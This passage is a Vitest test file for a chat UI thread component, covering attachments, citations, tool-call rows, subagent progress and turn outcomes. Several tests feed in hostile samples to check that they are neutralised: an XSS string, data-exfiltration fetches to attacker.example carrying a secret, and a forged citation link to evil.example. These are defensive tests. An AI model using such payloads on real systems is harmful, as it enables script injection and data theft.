/**
 * @vitest-environment happy-dom
 */

import { readFileSync } from 'node:fs';
import { join } from 'node:path';

import { act, createElement, type ReactElement } from 'react';
import { createRoot, type Root } from 'react-dom/client';
import { MemoryRouter } from 'react-router-dom';
import { afterEach, beforeAll, describe, expect, it, vi } from 'vite-plus/test';

import { parseUpdates } from '../src/agent-sessions/transcript.js';
import { NoticeLine } from '../ui/src/components/arc-x/notice-line/notice-line.js';
import {
  ChatThread,
  ConversationNotices,
  MOUNTED_TURNS,
  type ChatThreadProps,
} from '../ui/src/components/chat-thread.js';
import { CHAT, fill } from '../ui/src/lib/chat-strings.js';
import type { HelperProgress, LiveActivity, PermissionMark, RetryLive } from '../ui/src/lib/chat-types.js';
import { formatBytes, formatClock } from '../ui/src/lib/format.js';
import { NEVER_NOTE_HEAD, NEVER_NOTE_TAIL } from '../ui/src/lib/permission-text.js';
import { WAKE_ENDED, WAKE_REPORTED } from '../ui/src/lib/sessions.js';
import type { TranscriptEntry } from '../ui/src/lib/types.js';
import { formatErrorText } from '../ui/src/lib/web-result-text.js';
import {
  CITED_ANSWER,
  FETCH_USER_URL,
  FORGED_CITATION,
  OTHER_ROWS,
  RECORDED_DIRECT,
  RECORDED_USE_TOOL,
  RUST_POST,
  THREAD_SAMPLES,
  UNFINISHED,
  WEB_ERRORS,
  answer,
  directFetch,
  end,
  metric,
  T0,
  thinking,
  liveOutcomeSample,
  longThread,
  outcomeSample,
  streamingSample,
  user,
  finishedRun,
  RUN_ID,
  runSample,
  workflowRun,
  type ThreadSample,
} from './helpers/chat-thread-fixtures.js';
import { runView } from './helpers/run-views.js';
import { allByRole, byRole, skipAnimations, waitFor } from './render.js';

let mounted: { root: Root; container: HTMLElement } | undefined;

const messageRenders = vi.hoisted(() => ({ n: 0 }));
vi.mock('../ui/src/components/arc-x/message/message.js', async (importOriginal) => {
  const real = await importOriginal<typeof import('../ui/src/components/arc-x/message/message.js')>();
  return {
    ...real,
    Message: (props: Parameters<typeof real.Message>[0]) => {
      messageRenders.n += 1;
      return real.Message(props);
    },
  };
});

beforeAll(() => {
  skipAnimations(true);
});

function threadOf(sample: ThreadSample, extra: Partial<ChatThreadProps> = {}): ReactElement {
  return createElement(
    MemoryRouter,
    null,
    createElement(ChatThread, {
      mode: sample.mode,
      entries: sample.entries,
      turns: sample.turns,
      turn: sample.turn,
      lastEnd: sample.lastEnd,
      ...extra,
    }),
  );
}

function mount(element: ReactElement): HTMLElement {
  globalThis.IS_REACT_ACT_ENVIRONMENT = true;
  const container = document.createElement('div');
  document.body.appendChild(container);
  const root = createRoot(container);
  act(() => root.render(element));
  mounted = { root, container };
  return container;
}

function rerender(element: ReactElement): void {
  act(() => mounted!.root.render(element));
}

afterEach(() => {
  if (mounted === undefined) return;
  const { root, container } = mounted;
  act(() => root.unmount());
  container.remove();
  mounted = undefined;
});

/** A wait line's words, without its clock. */
function waitText(line: Element | null | undefined): string | undefined {
  const copy = line?.cloneNode(true) as HTMLElement | undefined;
  copy?.querySelector('[data-wait-clock]')?.remove();
  return copy?.textContent ?? undefined;
}

function anchors(container: HTMLElement): string[] {
  return [...container.querySelectorAll('a[href]')].map((a) => a.getAttribute('href') ?? '');
}

describe('ChatThread: files on a message', () => {
  it('a message sent with files shows read-only chips; one without draws none', () => {
    const sample: ThreadSample = {
      mode: 'chat',
      entries: [
        {
          kind: 'user',
          ts: T0,
          text: 'Look at these',
          promptIndex: 1,
          attachments: [
            { kind: 'file', name: 'notes.md', bytes: 2048 },
            { kind: 'image', mediaType: 'image/png', bytes: 4096 },
          ],
        },
        answer('Seen'),
        end(),
        user('And now?'),
        answer('Nothing attached'),
        end(),
      ],
      turns: [],
      turn: null,
      lastEnd: null,
    };
    const container = mount(threadOf(sample));
    const lists = allByRole(container, 'list', CHAT.attach.list);
    expect(lists).toHaveLength(1);
    expect(allByRole(lists[0]!, 'listitem').map((item) => item.textContent)).toEqual([
      `notes.md${formatBytes(2048)}`,
      `${CHAT.attach.image}PNG · ${formatBytes(4096)}`,
    ]);
    expect(lists[0]!.querySelector('button, img')).toBeNull();
    expect(container.textContent).toContain('Look at these');
  });

  it('a message with only a picture still draws its row', () => {
    const container = mount(
      threadOf({
        mode: 'chat',
        entries: [
          {
            kind: 'user',
            ts: T0,
            text: '',
            promptIndex: 1,
            attachments: [{ kind: 'image', mediaType: 'image/jpeg', bytes: 100 }],
          },
          answer('A dog'),
          end(),
        ],
        turns: [],
        turn: null,
        lastEnd: null,
      }),
    );
    expect(allByRole(byRole(container, 'list', CHAT.attach.list)!, 'listitem')).toHaveLength(1);
  });
});

describe('ChatThread: a sent command (#6)', () => {
  it('draws the command name as a chip and the rest as plain text; other text stays as typed', () => {
    const container = mount(
      threadOf({
        mode: 'work',
        entries: [
          user('/goal ship <b>it</b>'),
          answer('Goal set.'),
          end(),
          user('/usr/bin is broken'),
          answer('Look at PATH.'),
          end(),
          user('/compact'),
          answer('Done.'),
          end(),
        ],
        turns: [],
        turn: null,
        lastEnd: null,
      }),
    );
    const chips = [...container.querySelectorAll('[data-command-text]')];
    expect(chips.map((c) => c.firstElementChild!.textContent)).toEqual(['/goal', '/compact']);
    expect(chips[0]!.textContent).toBe('/goalship <b>it</b>');
    expect(chips[0]!.querySelector('b')).toBeNull();
    expect(chips[1]!.childElementCount).toBe(1);
    expect(container.textContent).toContain('/usr/bin is broken');
  });
});

describe('ChatThread: sources and citations', () => {
  it('cited sources become chips, the written Sources block is replaced, a chip opens and focuses its source', async () => {
    const container = mount(threadOf(CITED_ANSWER));
    const one = byRole(container, 'button', 'Source 1: Rust 1.99 released, blog.rust-lang.org');
    expect(one).not.toBeNull();
    expect(byRole(container, 'button', 'Source 2: Rust releases, releases.rs')).not.toBeNull();
    expect(container.textContent).not.toContain('Sources:');
    expect(container.textContent).toContain('Sources');
    const more = byRole(container, 'button', 'Show all 2 sources');
    expect(more?.getAttribute('aria-expanded')).toBe('false');
    act(() => one!.click());
    await waitFor(() => more?.getAttribute('aria-expanded') === 'true');
    const focused = document.activeElement as HTMLAnchorElement | null;
    expect(focused?.getAttribute('href')).toBe(RUST_POST);
  });

  it('a forged citation stays text and a link to a host outside the conversation is not a link', () => {
    const container = mount(threadOf(FORGED_CITATION));
    expect(
      allByRole(container, 'button').filter((b) => (b.getAttribute('aria-label') ?? '').startsWith('Source ')),
    ).toHaveLength(1);
    expect(container.textContent).toContain('as the guide says [2]');
    expect(anchors(container).some((href) => href.includes('evil.example'))).toBe(false);
    expect(container.textContent).toContain('here (evil.example)');
  });

  it('a link to an address the user gave is active and opens outside', () => {
    const container = mount(threadOf(FETCH_USER_URL));
    const link = [...container.querySelectorAll('a')].find((a) => a.textContent === 'guide');
    expect(link?.getAttribute('href')).toBe('https://docs.example.org/guide');
    expect(link?.getAttribute('target')).toBe('_blank');
    expect(link?.getAttribute('rel')).toBe('noreferrer');
    expect(container.textContent).toContain('cut at 12,000 characters');
  });

  it('model HTML is text, never an element', () => {
    const sample: ThreadSample = {
      ...CITED_ANSWER,
      entries: [user('hi'), answer('<img src=x onerror=alert(1)> <script>alert(1)</script> [x](javascript:alert(1))')],
      turns: [],
    };
    const container = mount(threadOf(sample));
    expect(container.querySelector('img')).toBeNull();
    expect(container.querySelector('script')).toBeNull();
    expect(container.textContent).toContain('<img src=x onerror=alert(1)>');
    expect(anchors(container).some((href) => href.startsWith('javascript'))).toBe(false);
  });
});

describe('ChatThread: web call rows', () => {
  it('shape A: the refused search_tool row is hidden, the use_tool search reads as Searched', () => {
    const container = mount(threadOf(RECORDED_USE_TOOL));
    expect(container.textContent).not.toContain('search_tool');
    expect(container.textContent).not.toContain('use_tool');
    expect(container.textContent).toContain('Searched');
    expect(container.textContent).toContain('"Rust newest stable version release 2026"');
    expect(container.textContent).toContain('2 results');
    expect(container.textContent).toContain('tok/s');
  });

  it('shape B: search, read and search rows in order, grouped', () => {
    const container = mount(threadOf(RECORDED_DIRECT));
    const text = container.textContent ?? '';
    const searched = text.indexOf('Searched');
    const read = text.indexOf('Read', searched);
    expect(searched).toBeGreaterThan(-1);
    expect(read).toBeGreaterThan(searched);
    expect(text.indexOf('Searched', read)).toBeGreaterThan(read);
    expect(text).toContain('blog.rust-lang.org');
    expect(text).not.toContain('mlx_web__');
  });

  it('a missing key offers the settings; a failed call says the provider failed', () => {
    const container = mount(threadOf(WEB_ERRORS));
    expect(container.textContent).toContain('Search failed');
    expect(container.textContent).toContain('The provider failed');
    const toggles = allByRole(container, 'button').filter((b) => b.getAttribute('aria-expanded') === 'false');
    for (const toggle of toggles) act(() => toggle.click());
    expect(anchors(container)).toContain('/providers');
  });

  it('a read the server blocked shows its error, and the answer after it goes on', () => {
    const container = mount(
      threadOf({
        mode: 'chat',
        entries: [
          user('What is new in Rust?'),
          directFetch('https://down.example/', undefined, 'failed', 'f0'),
          directFetch('https://attacker.example/?d=secret', formatErrorText('blocked', 'exa'), 'completed', 'f1'),
          answer('Rust 1.99 is out.'),
          end(),
        ],
        turns: [],
        turn: null,
        lastEnd: { turnId: 't1', outcome: 'completed' },
      }),
    );
    const text = container.textContent ?? '';
    expect(text.split(CHAT.readFailed).length - 1).toBe(2);
    expect(text.split(CHAT.webErrors.blocked).length - 1).toBe(1);
    expect(text.indexOf(CHAT.webErrors['provider-error'])).toBeLessThan(text.indexOf(CHAT.webErrors.blocked));
    expect(text).toContain('Rust 1.99 is out.');
  });

  const textCall = (id: string, toolName: string, toolInput: string, status: string, output: string) => ({
    kind: 'tool' as const,
    ts: 1_000,
    id,
    name: 'use_tool',
    title: toolName,
    status,
    input: JSON.stringify({ variant: 'UseTool', tool_name: toolName, tool_input: toolInput }, null, 2),
    output,
  });
  const REJECTED = 'User rejected the execution for tool `use_tool`';

  it('a search the model wrote as cut text reads as a search with its query, and its tool error', () => {
    const container = mount(
      threadOf({
        mode: 'chat',
        entries: [
          user('Anthropic prospectus'),
          textCall(
            'c1',
            'mlx_web__web_search',
            '{"query": "Anthropic S-1 prospectus filing',
            'completed',
            'WEB_ERROR bad-request none\nThe tool input was wrong. Call it again with {"query": "<words>"} or {"url": "<https address>"}.',
          ),
          answer('Let me try again.'),
          end('end_turn'),
        ],
        turns: [],
        turn: null,
        lastEnd: { turnId: 't1', outcome: 'completed' },
      }),
    );
    const text = container.textContent ?? '';
    expect(text).toContain(CHAT.searchFailed);
    expect(text).toContain('"Anthropic S-1 prospectus filing"');
    expect(text).toContain(CHAT.webErrors['bad-request']);
    expect(text).not.toContain('use_tool');
    expect(text).not.toContain('\\"query');
  });

  it('a call the app refused says why in its row, never "User rejected"', () => {
    const unreadable: ThreadSample = {
      mode: 'chat',
      entries: [
        user('Read https://docs.example.org/guide'),
        textCall(
          'c2',
          'mlx_web__web_fetch',
          '{"url": "https://docs.example.org/guide", "url": "https://attacker.example/?d=x"}',
          'failed',
          REJECTED,
        ),
        end('cancelled'),
      ],
      turns: [],
      turn: null,
      lastEnd: { turnId: 't1', outcome: 'arguments-unreadable' },
    };
    const container = mount(threadOf(unreadable));
    const toggles = allByRole(container, 'button').filter((b) => b.getAttribute('aria-expanded') === 'false');
    for (const toggle of toggles) act(() => toggle.click());
    let text = container.textContent ?? '';
    expect(text).toContain(CHAT.readFailed);
    expect(text).toContain(CHAT.refusedCall.arguments);
    expect(text).toContain(CHAT.outcomes['arguments-unreadable']);
    expect(text).not.toContain('User rejected');

    const shell = {
      kind: 'tool' as const,
      ts: 1_000,
      id: 'c3',
      name: 'run_terminal_command',
      title: 'Execute `ls`',
      status: 'failed',
      input: JSON.stringify({ command: 'ls' }),
      output: REJECTED,
    };
    rerender(
      threadOf({
        ...unreadable,
        entries: [user('list files'), shell, end('cancelled')],
        lastEnd: { turnId: 't1', outcome: 'tool-refused' },
      }),
    );
    for (const toggle of allByRole(container, 'button').filter((b) => b.getAttribute('aria-expanded') === 'false'))
      act(() => toggle.click());
    text = container.textContent ?? '';
    expect(text).toContain(CHAT.refusedCall.tool);
    expect(text).not.toContain('User rejected');
  });

  it('a Work command row captions its command and output and says when the output was cut', async () => {
    const tool = {
      kind: 'tool' as const,
      ts: 1_000,
      id: 't-run',
      name: 'run_terminal_command',
      title: 'Execute',
      status: 'completed',
      input: JSON.stringify({ command: 'cat big.log' }),
      output: 'line 1\nline 2',
      truncated: true,
    };
    const container = mount(
      threadOf({
        ...liveOutcomeSample('completed', 'work'),
        entries: [user('Show it', 900), tool, end('end_turn', 2_000)],
      }),
    );
    const row = [...container.querySelectorAll<HTMLButtonElement>('button[aria-expanded]')].find((b) =>
      (b.getAttribute('aria-label') ?? '').startsWith('Ran, cat big.log'),
    );
    act(() => row!.click());
    await waitFor(() => (container.textContent ?? '').includes('Long fields are truncated for display.'));
    const captions = [...container.querySelectorAll('figure')].map((f) => f.previousElementSibling?.textContent);
    expect(captions).toEqual([CHAT.command, CHAT.output]);
  });

  it('Work command rows from the agent: no output says so, and an exit code, stop or timeout is on the row', async () => {
    const lines = readFileSync(join(import.meta.dirname, 'fixtures/agent-updates/bash-rows.jsonl'), 'utf8');
    const tools = parseUpdates(lines).transcript;
    const container = mount(
      threadOf({
        ...liveOutcomeSample('completed', 'work'),
        entries: [user('Run them', 1_794_449_060_000), ...tools, end('end_turn', 1_794_449_070_000)],
      }),
    );
    const rows = [...container.querySelectorAll<HTMLButtonElement>('button[aria-expanded]')];
    const label = (command: string): string =>
      rows.map((b) => b.getAttribute('aria-label') ?? '').find((l) => l.startsWith(`Ran, ${command},`)) ?? '';
    expect(label('ls missing')).toContain(fill(CHAT.exitCode, { code: 2 }));
    expect(label('sleep 999')).toContain(CHAT.exitTimedOut);
    for (const command of ['ls', 'true']) {
      expect(label(command)).not.toContain(fill(CHAT.exitCode, { code: 0 }));
      expect(label(command)).not.toContain(CHAT.exitTimedOut);
    }
    const empty = rows.find((b) => (b.getAttribute('aria-label') ?? '').startsWith('Ran, true,'))!;
    act(() => empty.click());
    await waitFor(() => (container.textContent ?? '').includes(CHAT.noOutput));
    expect(container.textContent).not.toContain('current_dir');
    expect(container.textContent?.split(CHAT.noOutput).length).toBe(2);
  });

  it('a stop the agent named reads as such on the row', () => {
    const tool = {
      kind: 'tool' as const,
      ts: 1_000,
      id: 't-oom',
      name: 'run_terminal_command',
      title: 'Execute',
      status: 'failed',
      input: JSON.stringify({ command: 'make' }),
      output: 'building',
      signal: 'oom',
    };
    const container = mount(
      threadOf({
        ...liveOutcomeSample('completed', 'work'),
        entries: [user('Build', 900), tool, end('end_turn', 2_000)],
      }),
    );
    const labels = [...container.querySelectorAll('button[aria-expanded]')].map((b) => b.getAttribute('aria-label'));
    expect(labels.find((l) => l?.startsWith('Command failed, make,'))).toContain(
      fill(CHAT.exitSignal, { signal: 'oom' }),
    );
  });

  it('the plan request row reads Plan review', () => {
    const tool = {
      kind: 'tool' as const,
      ts: 1_000,
      id: 't-plan',
      name: 'exit_plan_mode',
      title: 'exit_plan_mode',
      status: 'completed',
    };
    const container = mount(
      threadOf({
        ...liveOutcomeSample('completed', 'work'),
        entries: [user('Plan it', 900), tool, end('end_turn', 2_000)],
      }),
    );
    expect(container.textContent).toContain(CHAT.planReview);
    expect(container.textContent).not.toContain('exit_plan_mode');
  });

  it('Work rows: model switch, plan, a file read, subagent, wake and an unknown kind as a plain row', () => {
    const container = mount(threadOf(OTHER_ROWS));
    const text = container.textContent ?? '';
    expect(text).toContain('Model switched to qwen3.5-9b');
    expect(text).toContain('Patch the file');
    expect(text).toContain('Readsrc/main.rs');
    expect(text).not.toContain('read_file');
    expect(text).toContain('Look for callers');
    expect(text).toContain('No prompt typed');
    expect(text).toContain('hologram');
    expect(text).toContain('Fixed.');
  });
});

describe('ChatThread: a subagent row ticks while it runs, then keeps its final numbers (#10)', () => {
  const S = CHAT.subagent;
  const KIND = `${S.label} · explore`;
  const helper = (over: Partial<Extract<TranscriptEntry, { kind: 'subagent' }>> = {}): TranscriptEntry => ({
    kind: 'subagent',
    ts: T0 + 100,
    childId: 'child-1',
    type: 'explore',
    description: 'Find the flaky test',
    ...over,
  });
  const tick = (over: Partial<HelperProgress> = {}): HelperProgress => ({
    childId: 'child-1',
    contextWindow: null,
    now: null,
    turns: 2,
    toolCalls: 12,
    tokens: 18_200,
    contextPct: 41,
    errors: 0,
    failedCalls: 0,
    durationMs: 134_000,
    at: T0 + 134_100,
    ...over,
  });
  /** The row's state word, its head facts and its second line, by their text. */
  function rowOf(container: HTMLElement): { word: string; facts: string | null; sub: string | null } {
    const row = container.querySelector<HTMLElement>('[data-agent-id="child-1"]')!;
    return {
      word: row.querySelector('[data-agent-word]')?.textContent ?? '',
      facts: row.querySelector('[data-agent-facts]')?.textContent ?? null,
      sub: row.querySelector('[data-helper-sub]')?.textContent ?? null,
    };
  }
  const draw = (entry: TranscriptEntry, extra: Partial<ChatThreadProps> = {}): HTMLElement =>
    mount(
      threadOf(
        {
          mode: 'work',
          entries: [user('Find it'), entry, answer('Started it.'), end()],
          turns: [metric()],
          turn: null,
          lastEnd: null,
        },
        extra,
      ),
    );

  const unmount = (): void => {
    if (mounted === undefined) return;
    const { root, container } = mounted;
    act(() => root.unmount());
    container.remove();
    mounted = undefined;
  };

  afterEach(() => {
    vi.useRealTimers();
  });

  // Mutation: put the tool calls in the head → the head holds the counts of the second line.
  it('running: what it does now, its time and how full its context is in the head; its turn and tool calls on the second line', () => {
    vi.useFakeTimers({ now: T0 + 134_100, toFake: ['Date', 'setInterval', 'clearInterval'] });
    const reading = tick({ now: { kind: 'tool', title: 'Read spec.ts' } });
    const container = draw(helper(), {
      live: { helpers: [reading], agents: [], tasks: [], schedules: [], reports: [], stoppedByYou: [] },
      agentLive: true,
    });
    const row = rowOf(container);
    expect(row.word).toBe(fill(CHAT.agent.now.running, { title: 'Read spec.ts' }));
    expect(row.facts).toBe(`2:14 · ${fill(CHAT.agent.facts.contextPct, { pct: 41 })}`);
    expect(row.sub).toBe([KIND, fill(CHAT.activity.progressTurn, { n: 2 }), fill(S.toolCalls, { n: 12 })].join(' · '));
    act(() => {
      vi.advanceTimersByTime(2_000);
    });
    expect(rowOf(container).facts).toBe(`2:16 · ${fill(CHAT.agent.facts.contextPct, { pct: 41 })}`);
  });

  it('before its first tick: Starting and its time, no counts', () => {
    vi.useFakeTimers({ now: T0 + 1_100, toFake: ['Date', 'setInterval', 'clearInterval'] });
    const row = rowOf(
      draw(helper(), {
        live: { helpers: [], agents: [], tasks: [], schedules: [], reports: [], stoppedByYou: [] },
        agentLive: true,
      }),
    );
    expect(row.word).toBe(CHAT.agent.now.starting);
    expect(row.facts).toBe('0:01');
    expect(row.sub).toBe(KIND);
  });

  // Mutation: compare the quiet time with 2 s instead of 20 s → "Quiet" at once.
  it('quiet: no tick for 20 s says Quiet for m:ss in place of Running', () => {
    vi.useFakeTimers({ now: T0 + 134_100, toFake: ['Date', 'setInterval', 'clearInterval'] });
    const container = draw(helper(), {
      live: {
        helpers: [tick({ at: T0 + 114_100, errors: 1 })],
        agents: [],
        tasks: [],
        schedules: [],
        reports: [],
        stoppedByYou: [],
      },
      agentLive: true,
    });
    const row = rowOf(container);
    expect(row.word).toBe(fill(CHAT.activity.progressQuiet, { time: '0:20' }));
    expect(container.querySelector('[data-agent-id="child-1"]')!.getAttribute('data-mark')).toBe('quiet');
    expect(row.sub?.endsWith(` · ${CHAT.activity.progressErrorsOne}`)).toBe(true);
  });

  it('done: Done, its time and its context at its end; turns and tool calls on the second line; failed with its reason', () => {
    const done = rowOf(
      draw(
        helper({
          endTs: T0 + 134_000,
          status: 'completed',
          durationMs: 134_000,
          tokens: 21_480,
          turns: 3,
          toolCalls: 14,
        }),
        {
          live: { helpers: [tick()], agents: [], tasks: [], schedules: [], reports: [], stoppedByYou: [] },
          agentLive: true,
        },
      ),
    );
    expect(done.word).toBe(CHAT.agent.state.done);
    expect(done.facts).toBe(`2m 14s · ${fill(CHAT.agent.facts.contextAtEnd, { n: '21.5K' })}`);
    expect(done.sub).toBe([KIND, fill(S.turns, { n: 3 }), fill(S.toolCalls, { n: 14 })].join(' · '));
    unmount();
    const container = draw(
      helper({ endTs: T0 + 41_000, status: 'failed', durationMs: 41_000, turns: 1, toolCalls: 1, error: 'It broke.' }),
    );
    const failed = rowOf(container);
    expect(failed.word).toBe(CHAT.agent.state.failed);
    expect(failed.sub).toBe([KIND, S.turnsOne, S.toolCallsOne].join(' · '));
    expect(container.textContent).toContain('It broke.');
    expect(container.querySelector('[data-tone="danger"]')).not.toBeNull();
  });

  // Mutation: read `agentLive` as true always → a dead subagent reads Running for ever.
  it('no end and no agent process: not finished, no numbers', () => {
    const row = rowOf(
      draw(helper(), {
        live: { helpers: [tick()], agents: [], tasks: [], schedules: [], reports: [], stoppedByYou: [] },
        agentLive: false,
      }),
    );
    expect(row.word).toBe(CHAT.agent.state.unfinished);
    expect(row.facts).toBeNull();
    expect(row.sub).toBe(KIND);
  });
});

describe('ChatThread: the wake row names what ended (H-b)', () => {
  const cmd = (id: string, label: string) => ({ id, kind: 'command' as const, label });
  const named = (what: string, labels: string) => fill(WAKE_ENDED.named, { what, labels });

  // Mutation: name only the first ended task → "cargo build" is missing from the row.
  it.each([
    [{ cause: 'task', task: cmd('t1', 'npm test') }, named(WAKE_ENDED.command, 'npm test')],
    [
      { cause: 'task', task: { id: 't2', kind: 'monitor', label: 'Watch the build log' } },
      named(WAKE_ENDED.monitor, 'Watch the build log'),
    ],
    [
      { cause: 'notifications', tasks: [cmd('t3', 'npm test'), cmd('t4', 'cargo build')] },
      named(fill(WAKE_ENDED.commands, { n: 2 }), 'npm test, cargo build'),
    ],
    [
      { cause: 'subagent', subagent: { childId: 'c1', description: 'Find the flaky test' } },
      'Woken by subagent: Find the flaky test',
    ],
    [{ cause: 'task' }, 'Woken by a background task'],
  ] as const)('a wake of %o reads %s', (fields, title) => {
    const wake = { kind: 'wake', ts: T0, text: '', ...fields } as TranscriptEntry;
    const container = mount(
      threadOf({
        mode: 'work',
        entries: [wake, answer('Looked at it.'), end()],
        turns: [metric()],
        turn: null,
        lastEnd: null,
      }),
    );
    expect(container.textContent).toContain(title);
  });
});

describe('ChatThread: the automatic continue and the thought time', () => {
  const lengthEnd: TranscriptEntry = {
    kind: 'turn-end',
    ts: T0 + 2_000,
    stopReason: 'error',
    error: 'response truncated by max_tokens',
    lengthLimit: true,
  };
  const continued: TranscriptEntry = {
    kind: 'user',
    ts: T0 + 3_000,
    text: CHAT.continuePrompt,
    promptIndex: 1,
    continued: true,
  };

  // Mutation: draw the continued entry as a bubble → red.
  it('a continued entry draws a divider, not a bubble; a stored thought shows no time', () => {
    const sample: ThreadSample = {
      mode: 'work',
      entries: [
        user('fix it'),
        thinking('Let me look.'),
        lengthEnd,
        continued,
        answer('Done.', T0 + 4_000),
        end('end_turn', T0 + 5_000),
      ],
      turns: [metric(), metric()],
      turn: null,
      lastEnd: null,
    };
    const container = mount(threadOf(sample));
    const text = container.textContent ?? '';
    expect(text).toContain(CHAT.continued);
    expect(container.querySelectorAll('[data-role="user"]')).toHaveLength(1);
    expect(text).toContain(CHAT.outcomes['output-limit']);
    expect(text).not.toContain('response truncated');
    expect(text).toContain(CHAT.thought);
    expect(text).not.toContain(`${CHAT.thought} for`);
  });

  it('a thought timed live shows its time', () => {
    const timed: TranscriptEntry = { kind: 'thinking', ts: T0 + 100, endTs: T0 + 5_100, text: 'Hm.', timed: true };
    const container = mount(
      threadOf({ ...outcomeSample('end_turn'), entries: [user('hi'), timed, answer('ok'), end()] }),
    );
    expect(container.textContent).toContain(`${CHAT.thought} for 5`);
  });
});

describe('ChatThread: outcomes and actions', () => {
  it.each([
    ['cancelled', CHAT.outcomes['stopped-stored']],
    ['max_tokens', 'The answer hit the length limit.'],
  ])('stored end %s reads %s', (stopReason, sentence) => {
    const container = mount(threadOf(outcomeSample(stopReason)));
    expect(container.textContent).toContain(sentence);
  });

  it('an ended turn with an error shows the error as its detail', () => {
    const container = mount(threadOf(outcomeSample('refusal', 'model call failed: 500')));
    expect(container.textContent).toContain('Ended: refusal');
    expect(container.textContent).toContain('model call failed: 500');
  });

  it('a live outcome wins over the stored end', () => {
    const container = mount(threadOf(liveOutcomeSample('tool-refused')));
    expect(container.textContent).toContain('Stopped: the model asked for a tool that Chat does not have.');
  });

  it('an unfinished last turn offers Send again with its prompt; disabled with a reason', () => {
    const onTurnAction = vi.fn();
    const container = mount(threadOf(UNFINISHED, { onTurnAction }));
    expect(container.textContent).toContain('This answer did not finish.');
    act(() => byRole(container, 'button', 'Send again')!.click());
    expect(onTurnAction).toHaveBeenCalledWith({ kind: 'send-again', text: 'Write a poem' });
    rerender(threadOf(UNFINISHED, { onTurnAction, actionDisabledReason: 'The engine is stopped.' }));
    expect((byRole(container, 'button', 'Send again') as HTMLButtonElement).disabled).toBe(true);
  });

  it('Send again names a lost file: the label says it goes without them unless the page still holds them', async () => {
    const withFiles: ThreadSample = {
      ...UNFINISHED,
      entries: [
        {
          kind: 'user',
          ts: T0,
          text: 'Write a poem',
          promptIndex: null,
          attachments: [{ kind: 'file', name: 'poem.txt', bytes: 12 }],
        },
        answer('Roses'),
      ],
    };
    const onTurnAction = vi.fn();
    const container = mount(threadOf(withFiles, { onTurnAction }));
    expect(byRole(container, 'button', CHAT.sendAgain)).toBeNull();
    act(() => byRole(container, 'button', CHAT.sendAgainNoFiles)!.click());
    expect(onTurnAction).toHaveBeenCalledWith({ kind: 'send-again', text: 'Write a poem' });
    rerender(threadOf(withFiles, { onTurnAction, keptFor: 'Write a poem' }));
    await waitFor(() => byRole(container, 'button', CHAT.sendAgain) !== null);
    rerender(threadOf(UNFINISHED, { onTurnAction, keptFor: null }));
    await waitFor(() => byRole(container, 'button', CHAT.sendAgain) !== null);
  });

  it('a model switch after an unfinished turn is drawn below its footer', () => {
    const sample: ThreadSample = {
      ...UNFINISHED,
      entries: [...UNFINISHED.entries, { kind: 'model', ts: 1_794_411_002_000, modelId: 'qwen3.5-9b' }],
    };
    const container = mount(threadOf(sample));
    const text = container.textContent ?? '';
    const footer = text.indexOf('This answer did not finish.');
    const rule = text.indexOf('Model switched to qwen3.5-9b');
    expect(footer).toBeGreaterThan(-1);
    expect(rule).toBeGreaterThan(footer);
  });

  it('a denied turn stays denied once the next turn of the open conversation has ended', () => {
    const first = [user('Run it', 1_000), end('cancelled', 2_000)];
    const container = mount(threadOf({ ...liveOutcomeSample('denied', 'work'), entries: first }));
    expect(container.textContent).toContain(CHAT.outcomes.denied);
    const both = [...first, user('Read it', 3_000), answer('Done', 3_500), end('end_turn', 4_000)];
    rerender(threadOf({ ...liveOutcomeSample('completed', 'work'), entries: both }));
    expect(container.textContent).toContain(CHAT.outcomes.denied);
    expect(container.textContent).not.toContain(CHAT.outcomes.cancelled);
  });

  it('an outcome seen in one conversation never shows on a turn of another', () => {
    const first = [user('Run it', 1_000), end('cancelled', 2_000)];
    const container = mount(
      threadOf({ ...liveOutcomeSample('denied', 'work'), entries: first }, { conversationId: 'a' }),
    );
    expect(container.textContent).toContain(CHAT.outcomes.denied);
    const other = [user('Stop it', 1_000), end('cancelled', 2_000), user('Again', 3_000), answer('Done', 3_500)];
    rerender(
      threadOf(
        { ...liveOutcomeSample('completed', 'work'), entries: [...other, end('end_turn', 4_000)] },
        { conversationId: 'b' },
      ),
    );
    expect(container.textContent).toContain(CHAT.outcomes['stopped-stored']);
    expect(container.textContent).not.toContain(CHAT.outcomes.denied);
  });

  it('the length limit offers Continue', () => {
    const onTurnAction = vi.fn();
    const container = mount(threadOf(liveOutcomeSample('output-limit'), { onTurnAction }));
    act(() => byRole(container, 'button', 'Continue')!.click());
    expect(onTurnAction).toHaveBeenCalledWith({ kind: 'continue', text: 'continue' });
  });

  it('every sample renders', () => {
    for (const [name, sample] of Object.entries(THREAD_SAMPLES)) {
      const container = mount(threadOf(sample));
      expect(container.textContent, name).not.toBe('');
      act(() => mounted!.root.unmount());
      container.remove();
      mounted = undefined;
    }
  });
});

describe('ChatThread: streaming and live region', () => {
  it('a streaming answer is busy and has no footer; the end announces once', () => {
    const onStatus = vi.fn();
    const running = streamingSample('Borrowing lets **you');
    const container = mount(threadOf({ ...running, entries: running.entries.slice(0, 2) }, { onStatus }));
    expect(onStatus).not.toHaveBeenCalled();
    rerender(threadOf(running, { onStatus }));
    expect(container.querySelector('article[aria-busy="true"]')).not.toBeNull();
    expect(container.querySelector('strong')?.textContent).toBe('you');
    expect(byRole(container, 'button', 'Copy answer')).toBeNull();
    expect(onStatus).toHaveBeenCalledWith('Answer started.');
    rerender(
      threadOf(
        { ...running, entries: [...running.entries.slice(0, 2), answer('Borrowing lets **you** use')] },
        { onStatus },
      ),
    );
    expect(onStatus).toHaveBeenCalledTimes(1);
    const ended: ThreadSample = {
      ...running,
      entries: [
        ...running.entries.slice(0, 2),
        answer('Borrowing lets **you** use it.'),
        { kind: 'turn-end', ts: 9, stopReason: 'end_turn' },
      ],
      turn: null,
      lastEnd: { outcome: 'completed' },
    };
    rerender(threadOf(ended, { onStatus }));
    expect(onStatus).toHaveBeenLastCalledWith('Answer finished.');
    expect(container.querySelector('article[aria-busy="true"]')).toBeNull();
  });

  it('a stream event re-renders only the streaming turn, in Chat as in Work', () => {
    for (const mode of ['chat', 'work'] as const) {
      const base = longThread(5);
      const stream = (text: string): ThreadSample => ({
        ...base,
        mode,
        entries: [...base.entries, user('Next'), answer(text)],
        turn: { turnId: 't', phase: 'running', startedAt: 0, wait: null },
      });
      mount(threadOf(stream('a')));
      messageRenders.n = 0;
      for (let i = 2; i < 12; i += 1) rerender(threadOf(stream('a'.repeat(i))));
      expect(messageRenders.n, mode).toBeLessThanOrEqual(20);
      act(() => mounted!.root.unmount());
      mounted!.container.remove();
      mounted = undefined;
    }
  });

